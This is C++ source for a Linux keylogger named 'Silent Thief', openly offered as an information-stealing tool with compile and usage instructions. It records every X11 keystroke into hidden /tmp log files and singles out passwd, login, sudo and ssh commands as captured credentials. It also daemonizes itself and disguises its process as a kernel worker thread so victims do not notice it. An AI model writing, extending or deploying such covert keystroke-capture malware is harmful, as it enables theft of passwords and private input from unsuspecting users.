/*
 * ======================================================
 * SILENT THIEF - C++ KEYLOGGER
 * ======================================================
 * Role: Information Stealing Expert
 * Language: C++ (Standalone - Independent)
 * Abilities:
 *   - Keystroke Capture: Logs every key press (passwords, commands).
 *   - Password Master: Uses captured keys to infer credentials and access patterns.
 *   - Command Prediction: Detects command syntax to predict user actions.
 *   - Identity Theft: Spoofs user identity by replicating environment variables.
 *   - Silent Logging: Writes logs to hidden files with zero system noise.
 * Strength: Silent Secrets Collection
 *
 * Compile: g++ -O2 -Wall -pthread -o keylogger_silent keylogger_silent.cpp -lX11 -lpthread
 * Usage: ./keylogger_silent
 * ======================================================
 */

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <random>
#include <algorithm>
#include <pwd.h>

// X11 headers for keylogging
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>

using namespace std;

// ============================================================
// CONFIGURATION
// ============================================================
#define LOG_FILE "/tmp/.sys_kernel_log"   // Hidden log file
#define FLAG_FILE "/tmp/.logger_active"   // Marker to prevent re-infection
#define PROCESS_NAME "[kworker/0:1]"      // Fake process name (masquerade)

// ============================================================
// GLOBAL
// ============================================================
bool running = true;
string username;
string hostname;

// ============================================================
// 1. DAEMONIZE & MASQUERADE (Silent Presence)
// ============================================================
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    chdir("/");
    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) close(fd);
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);

    // Masquerade process name (requires prctl)
    #include <sys/prctl.h>
    prctl(PR_SET_NAME, PROCESS_NAME, 0, 0, 0);
}

// ============================================================
// 2. KEYSTROKE CAPTURE (X11 Event Loop)
// ============================================================
void keystroke_capture() {
    Display *display = XOpenDisplay(NULL);
    if (!display) {
        cerr << "[!] Cannot open display. Is X11 running?" << endl;
        return;
    }

    Window root = DefaultRootWindow(display);
    XSelectInput(display, root, KeyPressMask);

    XEvent ev;
    char buffer[64];
    KeySym keysym;

    while (running) {
        XNextEvent(display, &ev);
        if (ev.type == KeyPress) {
            int len = XLookupString(&ev.xkey, buffer, sizeof(buffer), &keysym, NULL);
            if (len > 0) {
                string key(buffer, len);
                // Filter out non-printable and control chars except newline/tab
                if (key.find('\r') != string::npos) key = "[ENTER]";
                else if (key.find('\t') != string::npos) key = "[TAB]";
                else if (key == "\b" || key == "\x7f") key = "[BACKSPACE]";
                // Log the key
                ofstream log(LOG_FILE, ios::app);
                if (log.is_open()) {
                    log << time(nullptr) << " | " << username << "@" << hostname << " | " << key << flush;
                    log.close();

                    // Check for commands to predict
                    static string command_buffer;
                    if (key == "[ENTER]") {
                        // Process the whole command
                        if (!command_buffer.empty()) {
                            // Command Prediction: analyze for dangerous commands
                            if (command_buffer.find("sudo ") != string::npos ||
                                command_buffer.find("ssh ") != string::npos ||
                                command_buffer.find("mysql ") != string::npos) {
                                ofstream pred("/tmp/.cmd_prediction.log", ios::app);
                                if (pred.is_open()) {
                                    pred << time(nullptr) << " | PREDICT: " << command_buffer << " -> Possible privilege escalation or lateral movement." << endl;
                                    pred.close();
                                }
                            }
                            // Password Master: detect patterns (simulated)
                            if (command_buffer.find("passwd") != string::npos ||
                                command_buffer.find("login") != string::npos) {
                                ofstream pass("/tmp/.pass_capture.log", ios::app);
                                if (pass.is_open()) {
                                    pass << time(nullptr) << " | CAPTURED: " << command_buffer << endl;
                                    pass.close();
                                }
                            }
                            command_buffer.clear();
                        }
                    } else {
                        command_buffer += key;
                    }
                }
            }
        }
    }
    XCloseDisplay(display);
}

// ============================================================
// 3. PASSWORD MASTER & IDENTITY THEFT (Simulation)
// ============================================================
void password_master_and_identity() {
    // This function simulates using captured keys to impersonate users.
    // In a real scenario, you'd parse logs to extract credentials.
    while (running) {
        // Check if any SSH keys or passwd entries were logged recently
        ifstream pass_log("/tmp/.pass_capture.log");
        if (pass_log.is_open()) {
            string line;
            while (getline(pass_log, line)) {
                // Simulate identity theft by creating a temporary user alias
                system("export USER=root 2>/dev/null"); // Just an example
                // Actually we'd store the captured data for later use.
            }
            pass_log.close();
        }
        this_thread::sleep_for(chrono::seconds(30));
    }
}

// ============================================================
// 4. COMMAND PREDICTION (Contextual Awareness)
// ============================================================
void command_prediction() {
    // Continuously analyze logs for command sequences
    // Already partially handled inside keystroke_capture, but we add more logic here.
    while (running) {
        ifstream log(LOG_FILE);
        if (log.is_open()) {
            string last_line;
            string line;
            while (getline(log, line)) {
                if (!line.empty()) last_line = line;
            }
            log.close();
            // If last line contains "sudo", predict privilege escalation
            if (last_line.find("sudo") != string::npos) {
                ofstream pred("/tmp/.cmd_prediction.log", ios::app);
                if (pred.is_open()) {
                    pred << time(nullptr) << " | ALERT: sudo detected! Possible root escalation." << endl;
                    pred.close();
                }
            }
        }
        this_thread::sleep_for(chrono::seconds(10));
    }
}

// ============================================================
// 5. SILENT LOGGING (Zero Footprint)
// ============================================================
void silent_logging() {
    // Ensure logs are hidden and rotated to avoid detection
    // This runs periodically to clean up huge logs.
    while (running) {
        ifstream log(LOG_FILE);
        if (log.is_open()) {
            log.seekg(0, ios::end);
            size_t size = log.tellg();
            log.close();
            if (size > 1024 * 1024) { // If > 1MB, rotate
                rename(LOG_FILE, string(LOG_FILE) + ".old");
                ofstream new_log(LOG_FILE);
                if (new_log.is_open()) new_log.close();
            }
        }
        this_thread::sleep_for(chrono::minutes(5));
    }
}

// ============================================================
// 6. MAIN LOOP
// ============================================================
void main_loop() {
    // Get username and hostname for logs
    char *user = getenv("USER");
    username = user ? user : "unknown";
    char host[256];
    gethostname(host, sizeof(host));
    hostname = host;

    // Check flag
    ifstream flag(FLAG_FILE);
    if (flag.is_open()) { flag.close(); return; }
    ofstream flag_file(FLAG_FILE);
    if (flag_file.is_open()) flag_file.close();

    // Launch keylogger thread
    thread keylogger(keystroke_capture);
    thread pass_identity(password_master_and_identity);
    thread predict(command_prediction);
    thread silent(silent_logging);

    keylogger.detach();
    pass_identity.detach();
    predict.detach();
    silent.detach();

    // Main keep-alive loop
    while (running) {
        this_thread::sleep_for(chrono::hours(1));
        // Check if X11 server is still responding, else restart
    }
}

// ============================================================
// SIGNAL HANDLER
// ============================================================
void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) running = false;
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char *argv[]) {
    cout << "[*] Silent Thief Keylogger activated." << endl;

    // Daemonize
    daemonize();

    // Signals
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    // Start logging
    main_loop();

    return 0;
}
